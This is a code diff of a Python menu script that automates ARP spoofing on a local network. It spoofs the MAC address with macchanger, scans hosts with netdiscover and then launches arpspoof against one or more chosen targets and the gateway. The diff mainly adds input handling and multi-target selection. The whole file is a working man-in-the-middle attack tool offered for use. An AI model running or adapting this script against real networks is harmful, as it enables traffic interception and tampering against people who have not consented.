@@ -4,6 +4,9 @@ import subprocess
 import shlex
 from pathlib import Path
 
+NETDCR_TXT = 'netdiscover.txt'
+IPADDR_TXT = 'ipaddress.txt'
+ERROR_CODE = 999
 def run_command(command):
     listoutput = []
     process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
@@ -20,18 +23,21 @@ def run_command2(command):
 
 def ip_input(value):
     resultlist = []
-    if '-' in value:
-        first = int(value.split('-')[0].strip())
-        second = int(value.split('-')[1].strip())
-        for var in range(first, second+1):
-            resultlist.append(var)
-    elif ',' in value:
-        print('multi numbers')
-        for var in value.split(','):
-            number = int(var.strip())
-            resultlist.append(number)
-    else:
-         resultlist.append(int(value))
+    try:
+        if '-' in value:
+            first = int(value.split('-')[0].strip())
+            second = int(value.split('-')[1].strip())
+            for var in range(first, second+1):
+                resultlist.append(var)
+        elif ',' in value:
+            for var in value.split(','):
+                number = int(var.strip())
+                resultlist.append(number)
+        else:
+            resultlist.append(int(value))
+    except ValueError:
+        resultlist.append(ERROR_CODE)
+
     return resultlist
 
 def choose_step():
@@ -41,13 +47,16 @@ def choose_step():
         checkmac = 'changed'
     print('Your IP: {}, Interface: {}'.format(yourIP, interface))
     print('Gateway: {}, Current MAC: {} {}'.format(gateway, currmac, checkmac))
-    print('********************************************')
+    print('***********************************************')
     print('1. Change my MAC address (Recommendation!)')
     print('2. Scan my network')
     print('3. Arp Spoof ip address')
     print('0. Exit')
-    print('********************************************')
-    var = int(input())
+    print('***********************************************')
+    try:
+        var = int(input())
+    except ValueError:
+        var = ERROR_CODE
     return var
 
 iproute = run_command('ip route')
@@ -60,35 +69,33 @@ currmac = macchanger[0].split(" ")[4]
 permmac = macchanger[1].split(" ")[2]
 
 print(' ')
-print('********************************************')
-print('**************Minh*Nguyen*******************')
-print('********************************************')
-print('Welcome to Arp Spoof script! Please select: ')
+print('***********************************************')
+print('*****************Minh*Nguyen*******************')
+print('***********************************************')
+print('Welcome to Arp Spoofing script! Please select: ')
 
 while True:
     step = choose_step()
-
     if step == 1: # 1. Change my MAC address
+        run_command2('ifconfig ' + interface + ' down')
         result = run_command('macchanger -r ' + interface)
+        run_command2('ifconfig ' + interface + ' up')
+        run_command2('service network-manager restart')
         currmac = result[2].split(" ")[8]
 
     elif step == 2: # 2. Scan my network
-        run_command2('gnome-terminal -- /bin/bash -c \'netdiscover -r ' + rangeIP + ' | tee netdiscover.txt\'')
-        
+        run_command2('gnome-terminal -- /bin/bash -c \'netdiscover -r {} | tee {}\''.format(rangeIP, NETDCR_TXT))
 
     elif step == 3: # 3. Arp Spoof ip address
         
-        netdctxt = Path('netdiscover.txt')
+        netdctxt = Path(NETDCR_TXT)
         if not netdctxt.is_file():
             print('Please run Step 2.')
             continue
 
-        iptxt = Path('ipaddress.txt')
-        if not iptxt.is_file():
-            run_command2('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" netdiscover.txt | sort -u > ipaddress.txt')
-
+        run_command2('grep -oE \"\\b([0-9]{1,3}\.){3}[1-9]{1}[0-9]{0,2}\\b\" ' + NETDCR_TXT + ' | sort -u > ' + IPADDR_TXT)
         iplist = []
-        with open('ipaddress.txt', 'r') as fin:
+        with open(IPADDR_TXT, 'r') as fin:
             i = 1
             for line in fin:
                 line = line.strip()
@@ -96,26 +103,30 @@ while True:
                     print(i, 'Ip:', line)
                     i = i+1;
                     iplist.append(line)
-            
-        var = str(input("Please select one IP address ([0] to quit): "))
 
-        resultlist = ip_input(var)
+        print('Please select IP address(es) (Ex: 1; 1-3; or 1,2) ([0] to quit): ')
+        while True:
+            var = input()
+            resultlist = ip_input(var)
+            if max(resultlist) <= len(iplist):
+                break	
+
         if resultlist[0] == 0:
             continue
 
         for ipnum in resultlist:
-            run_command2('gnome-terminal -- arpspoof -i ' + interface + ' -t ' + iplist[ipnum-1] + ' -r ' + gateway)
-
-    else: # 0. Remove residual files and Exit
-        netdctxt = Path('netdiscover.txt')
+            run_command2('gnome-terminal -- arpspoof -i {} -t {} -r {}'.format(interface, iplist[ipnum-1],gateway))
+    elif step == 0: # 0. Remove residual files and Exit
+        netdctxt = Path(NETDCR_TXT)
         if netdctxt.is_file():
             netdctxt.unlink()
 
-        iptxt = Path('ipaddress.txt')
+        iptxt = Path(IPADDR_TXT)
         if iptxt.is_file():
             iptxt.unlink()
 
-        print('Bye!!!')
+        print('Goodbye!!!')
         exit()
-
+    else:
+        pass
 
